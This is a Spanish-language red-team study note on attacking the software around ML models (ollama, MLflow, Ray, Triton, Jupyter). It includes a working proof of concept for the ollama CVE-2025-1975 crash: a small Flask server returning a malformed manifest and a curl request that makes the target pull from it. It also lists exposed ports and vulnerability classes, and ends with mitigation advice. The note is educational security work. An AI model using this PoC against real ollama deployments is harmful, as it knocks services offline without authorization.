---
tags:
  - IA/Red-Team
  - IA
  - Pentesting/Explotacion
  - Pentesting/Enumeracion
Descripción: "Casi nunca se ataca el modelo: se ataca el software que lo rodea, un stack de MLOps joven, escrito para redes de confianza y con CVEs explotables sin autenticación"
Fecha de actualización: 2026-07-29
Nota previa: "[[06 - Model deployment tampering]]"
Nota siguiente: "[[08 - MLflow, del path traversal al RCE]]"
Area: "[[Aplicación y sistema.base|Aplicación y sistema]]"
---
---

<mark style="background: #ADCCFFA6;">Casi nunca se ataca el modelo directamente: se ataca el software que lo rodea.</mark> El stack de MLOps —servidores de inferencia, registros de modelos, orquestadores, plataformas de experimentación— es código joven, escrito entre 2020 y 2024 asumiendo redes internas de confianza, y acumula vulnerabilidades explotables sin autenticación a un ritmo que el software maduro dejó atrás hace una década. Es un problema de **cadena de suministro** (`OWASP LLM03: Supply Chain`), no del modelo.

Esta nota cubre el patrón general y el caso `ollama`; el de `MLflow`, por volumen de CVEs y por ser el servicio que más veces aparece expuesto, tiene [[08 - MLflow, del path traversal al RCE|nota propia]].

# Por qué el stack de ML es terreno fértil

Tres factores se combinan:

1. **Juventud.** Estos proyectos tienen pocos años y crecieron priorizando funcionalidad sobre seguridad. No han pasado por el escrutinio que endureció a Apache o nginx.
2. **Confianza por defecto.** Se diseñaron para clústeres internos. La autenticación es opcional —a menudo ni existe— y se asume que la red ya protege el servicio. Cuando ese servicio acaba expuesto, no hay segunda barrera.
3. **Superficie enorme.** Cada pieza carga formatos complejos (modelos, datasets, configuraciones), deserializa objetos, ejecuta código de usuario por diseño (un `job` de entrenamiento **es** código arbitrario) y expone APIs de administración potentes.

<mark style="background: #8000E1A6;">La consecuencia práctica: en un engagement de IA, el escaneo de puertos y el fingerprinting de versiones del stack de MLOps rinde más hallazgos críticos por hora que cualquier ataque sobre el modelo.</mark> El inventario de servicios y puertos está en [[10 - Ataques a los componentes de sistema]].

# El caso ollama: DoS por validación ausente

> [!info]+ Fuente: [CVE-2025-1975](https://nvd.nist.gov/vuln/detail/cve-2025-1975) (Ollama 0.5.11)
> `ollama` es una plataforma para ejecutar LLMs localmente. La versión 0.5.11 no comprueba el tamaño de un array al descargar un modelo de un servidor remoto, y un manifiesto manipulado provoca un `panic` de Go que tumba el servidor.

El vector es interesante porque el atacante **no ataca directamente** al servidor `ollama`: le hace descargar un modelo de un servidor malicioso. Un servidor Flask mínimo que devuelve un manifiesto con la estructura que dispara el fallo:

```python
from flask import Flask
app = Flask(__name__)

@app.route("/v2/dos/model/manifests/latest")
def exploit():
    return {"layers": [{}]}      # array vacío donde el código espera datos

app.run(host='127.0.0.1', port=5000)
```

Se dispara instruyendo a `ollama` (puerto por defecto `11434`) a descargar el modelo del servidor malicioso vía `/api/pull`:

```shell-session
$ curl -X POST -H 'Content-Type: application/json' \
    -d '{"model": "http://localhost:5000/dos/model", "insecure": true}' \
    http://localhost:11434/api/pull

{"status":"pulling manifest"}
curl: (18) transfer closed with outstanding read data remaining
```

El servidor cae con un `panic: runtime error: slice bounds out of range [:19] with length 0`. <mark style="background: #FFB86CA6;">Un solo `POST` bien formado deja el servicio fuera de combate</mark>, sin autenticación y sin volumen de tráfico.

## ollama tiene un historial, no un incidente aislado

`CVE-2025-1975` es una entre varias, y ese patrón —vulnerabilidades repetidas en el mismo servicio— es lo que se reporta, no la CVE concreta:

| Vulnerabilidad | Impacto |
| - | - |
| [CVE-2024-37032](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032) "Probllama" | **RCE** por `path traversal` en el manejo de manifiestos. Parcheado en 0.1.34. Fácil de explotar, muy expuesto en Kubernetes |
| Serie "More ProbLLMs" (Oligo) | 6 vulnerabilidades adicionales: divulgación de ficheros, DoS y `crashes`. Cuatro parcheadas en 0.1.47 |
| CVE-2025-1975 | DoS por validación de array ausente |

<mark style="background: #FF5582A6;">Un `ollama` expuesto a una red no confiable es un hallazgo por sí mismo</mark>: no está pensado para servir de cara al exterior, no trae autenticación, y su historial de RCE lo convierte en objetivo prioritario. Se descubren por millares con `Shodan` buscando el puerto `11434`.

# El patrón que unifica todo el stack

Más allá de los casos concretos, hay una taxonomía de clases de vulnerabilidad que se repite pieza a pieza. Reconocerla permite auditar un servicio nuevo sin conocer sus CVEs de memoria:

| Clase | Dónde aparece | Ejemplo |
| - | - | - |
| **Falta de autenticación por defecto** | Ray, Triton, MLflow, ollama, Jupyter | ShadowRay ([CVE-2023-48022](https://www.sentinelone.com/vulnerability-database/cve-2023-48022/)) |
| **Deserialización insegura** | Carga de modelos (`pickle`), config (`YAML`) | vLLM [CVE-2025-30165](https://github.com/vllm-project/vllm/security), [[11 - Pickle y la deserialización insegura de modelos\|pickle en artefactos]] |
| **Path traversal / LFI** | Carga y descarga de artefactos | MLflow, ollama Probllama |
| **SSRF** | Carga de modelos/datos por URL | ShellTorch, vLLM CVE-2026-25960, [[01 - Introducción a SSRF\|SSRF]] |
| **Ejecución de código por diseño** | APIs de `jobs`, notebooks | Ray jobs API, Jupyter sin token |
| **DoS por entrada patológica** | Parsers de modelo/manifiesto | ollama CVE-2025-1975 |

Los tres servicios que más rinden en la práctica hoy:

- **Ray** (`8265`) — RCE sin auth vía la API de `jobs`. La botnet ShadowRay 2.0 la explota masivamente. El vendor la disputa, así que **no habrá parche**: la única mitigación es red.
- **NVIDIA Triton** (`8000`/`8001`/`8002`) — [CVE-2026-24207](https://securityonline.info/nvidia-triton-inference-server-vulnerability-cve-2026-24207-authentication-bypass/), bypass de autenticación con CVSS 9.8 y RCE, parcheado en mayo de 2026 junto a otros siete fallos.
- **Jupyter** (`8888`) — notebooks sin token de autenticación equivalen a ejecución de Python arbitrario. Sigue siendo de los servicios expuestos más habituales en entornos de ciencia de datos.

# Detección y mitigación

- **Fingerprinting de versiones.** El primer paso siempre: identificar servicio y versión, y cruzar con la base de CVEs. `nuclei` tiene plantillas para Ray, MLflow, Triton y ollama; un escaneo con ellas es lo primero que se lanza.
- **Parcheo con SLA agresivo.** La ventana entre CVE y explotación masiva de estos servicios se mide en días. Priorizar el stack de ML al nivel de un servicio expuesto crítico.
- **Autenticación siempre, incluso "en interno".** El modelo de "la red ya protege" es exactamente lo que falla. Toda API del stack con autenticación fuerte y, donde exista, mTLS.
- **Segmentación de red.** Inferencia, registro, orquestación y experimentación en segmentos aislados, sin ruta desde Internet ni desde red de usuario. Es la mitigación de mayor impacto y la que compensa que muchos de estos servicios no puedan asegurarse de otra forma.
- **SBOM y escaneo de dependencias.** Un `Software Bill of Materials` del stack de ML y escaneo continuo (`grype`, `trivy`, `pip-audit`) para saber qué CVEs afectan al despliegue en cada momento.

> [!warning]+ El vendor que disputa la CVE
> Cuando el fabricante considera que la falta de autenticación es "una decisión de diseño" —el caso de Ray— **no va a haber parche**. El servicio es inseguro por construcción y la única defensa posible es de red y de arquitectura. Esto se reporta explícitamente: no es "actualizar a la versión X", es "este componente no debe estar accesible desde esta red, y no lo estará en ninguna versión futura".
